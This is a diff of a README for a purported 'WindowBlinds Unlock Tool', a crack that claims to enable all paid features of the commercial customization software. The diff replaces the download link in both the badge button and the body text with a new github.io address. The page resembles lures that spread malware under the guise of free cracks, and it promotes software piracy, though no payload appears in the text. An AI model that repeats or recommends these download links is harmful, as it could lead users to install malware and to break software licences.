@@ -6,7 +6,7 @@
 <h1 align="center">⚡️ WindowBlinds Unlock Tool</h1>
 
 <p align="center">
-  <a href="https://windowblinds-free-download.github.io/.github/" target="_blank">
+  <a href="https://windowblinds-download.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20WindowBlinds%20Unlock%20Tool-Enable%20All%20Features-FF6F00?style=for-the-badge&logo=windows&logoColor=white" 
          alt="Download WindowBlinds Unlock Tool" style="width: 540px; height: 37px;">
   </a>
@@ -96,7 +96,7 @@ Report bugs or contribute via Issues or Pull Requests.
 ## ⭐️ Unlock WindowBlinds – Full Desktop Customization
 
 Access all WindowBlinds features including themes, skins, taskbar customization, and visual styles.  
-[Download the Unlock Tool](https://windowblinds-free-download.github.io/.github/) and transform your Windows desktop.
+[Download the Unlock Tool](https://windowblinds-download.github.io/.github/) and transform your Windows desktop.
 
 ---
 
